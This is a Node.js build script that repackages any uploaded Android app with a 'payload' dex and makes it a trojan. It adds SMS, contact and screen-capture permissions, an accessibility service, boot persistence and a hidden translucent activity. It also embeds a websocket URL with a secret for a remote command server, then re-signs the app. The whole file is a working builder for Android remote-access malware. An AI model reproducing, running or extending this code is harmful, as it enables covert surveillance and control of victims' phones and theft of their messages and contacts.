const { execFile } = require('child_process');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const run = promisify(execFile);
const db = require('./db');
const APK_DIR = process.env.APK_DIR || path.join(__dirname, '..', 'apks');
const DEX = path.join(__dirname, '..', 'payload', 'build', 'classes.dex');

const PERMS = [
  'android.permission.INTERNET',
  'android.permission.ACCESS_NETWORK_STATE',
  'android.permission.ACCESS_WIFI_STATE',
  'android.permission.FOREGROUND_SERVICE',
  'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION',
  'android.permission.POST_NOTIFICATIONS',
  'android.permission.RECEIVE_BOOT_COMPLETED',
  'android.permission.WAKE_LOCK',
  'android.permission.READ_PHONE_STATE',
  'android.permission.QUERY_ALL_PACKAGES',
  'android.permission.READ_SMS',
  'android.permission.READ_CONTACTS'
];

const COMPONENTS = (pkg) => `
  <service android:name="com.arpit.access.AgentService" android:exported="false" android:foregroundServiceType="mediaProjection" />
  <service android:name="com.arpit.access.TouchService" android:exported="true" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
    <meta-data android:name="android.accessibilityservice" android:resource="@xml/arpit_accessibility" />
  </service>
  <receiver android:name="com.arpit.access.BootReceiver" android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.BOOT_COMPLETED" />
      <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
      <action android:name="android.intent.action.QUICKBOOT_POWERON" />
      <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
    </intent-filter>
  </receiver>
  <activity android:name="com.arpit.access.ConnectActivity" android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true" android:launchMode="singleTask" />
  <provider android:name="com.arpit.access.BootProvider"
            android:authorities="${pkg}.arpitboot"
            android:exported="false" android:initOrder="1000" />
`;

function patchManifest(xml, pkg) {
  xml = xml.replace(/<application/, PERMS.map(p => `  <uses-permission android:name="${p}" />`).join('\n') + '\n  <application');
  xml = xml.replace(/<\/application>/, COMPONENTS(pkg) + '\n</application>');
  return xml;
}

async function build({ buildId, inputApk, name }) {
  const work = path.join('/tmp', 'arpit-build', buildId);
  const src = path.join(work, 'src');
  const out = path.join(work, 'unsigned.apk');
  const aligned = path.join(work, 'aligned.apk');
  const finalApk = path.join(__dirname, '..', 'apks', `${buildId}.apk`);

  try {
    await run('apktool', ['d', '-f', '--use-aapt2', '-o', src, inputApk], { maxBuffer: 1 << 26 });

    // package name
    const manifestPath = path.join(src, 'AndroidManifest.xml');
    let xml = fs.readFileSync(manifestPath, 'utf8');
    const pkg = xml.match(/package="([^"]+)"/)[1];
    const label = (xml.match(/android:label="([^"]*)"/) || [])[1] || name;

    // payload dex
    fs.copyFileSync(path.join(__dirname, '..', 'payload', 'build', 'classes.dex'), path.join(src, 'classes.dex'));
    fs.copyFileSync(path.join(__dirname, '..', 'payload', 'res', 'xml', 'arpit_accessibility.xml'), path.join(src, 'res', 'xml', 'arpit_accessibility.xml'));
    fs.mkdirSync(path.join(src, 'assets'), { recursive: true });

    const b = db.prepare('SELECT secret FROM builds WHERE id=?').get(buildId);
    fs.writeFileSync(path.join(src, 'assets', 'arpit.json'), JSON.stringify({
      url: `${(process.env.BASE_URL || '').replace('https', 'wss')}/agent?b=${buildId}&k=${b.secret}`,
      id: buildId
    }));

    fs.writeFileSync(manifestPath, patchManifest(xml, pkg));
    db.prepare('UPDATE builds SET pkg=?, label=? WHERE id=?').run(pkg, label, buildId);

    await run('apktool', ['b', src, '-o', out], { maxBuffer: 1 << 26 });
    await run(`${process.env.BUILD_TOOLS}/zipalign`, ['-f', '4', out, aligned]);
    await run(`${process.env.BUILD_TOOLS}/apksigner`, [
      'sign', '--ks', process.env.KEYSTORE, '--ks-pass', `pass:${process.env.KS_PASS}`,
      '--ks-key-alias', process.env.KS_ALIAS, '--out', finalApk, aligned
    ], { maxBuffer: 1 << 26 });

    fs.mkdirSync(path.dirname(finalApk), { recursive: true });
    db.prepare("UPDATE builds SET status='ready', size=? WHERE id=?")
      .run(fs.statSync(finalApk).size, buildId);
  } catch (e) {
    db.prepare("UPDATE builds SET status='failed', err=? WHERE id=?")
      .run((e.stderr || e.message || '').toString().slice(-2000), buildId);
  } finally {
    fs.rm(work, { recursive: true, force: true }, () => {});
    fs.rm(inputApk, { force: true }, () => {});
  }
}

module.exports = { build };
